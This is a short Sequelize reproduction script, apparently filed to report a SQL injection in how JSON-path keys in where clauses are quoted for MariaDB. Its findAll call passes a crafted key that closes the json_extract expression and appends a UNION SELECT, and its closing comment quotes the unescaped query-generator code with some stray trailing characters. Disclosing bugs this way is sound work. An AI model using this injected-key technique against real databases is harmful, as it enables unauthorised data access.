'use strict';

/*
 * Copy this file to ./sscce.js
 * Add code from issue
 * npm run sscce-{dialect}
 */

const Sequelize = require('./index');
const sequelize = require('./test/support').createSequelizeInstance();

class Project extends Sequelize.Model {}

Project.init({
  name: Sequelize.STRING,
  target: Sequelize.JSON,
}, {
  sequelize,
  tableName: 'projects',
});

(async () => {
  await sequelize.sync({ force: true });

  console.log(await Project.findAll({
    where: {target: {"a')) AS DECIMAL) = 1 UNION SELECT VERSION(); -- ": 1}},
    attributes: ['name'],
    raw: true,
  }));
})();

// https://github.com/sequelize/sequelize/blob/master/lib/dialects/abstract/query-generator.js#L1059-L1061
// case 'mariadb':
//   pathStr = ['$'].concat(paths).join('.');
//   return `json_unquote(json_extract(${quotedColumn},'${pathStr}'))`;', ')+'}\'';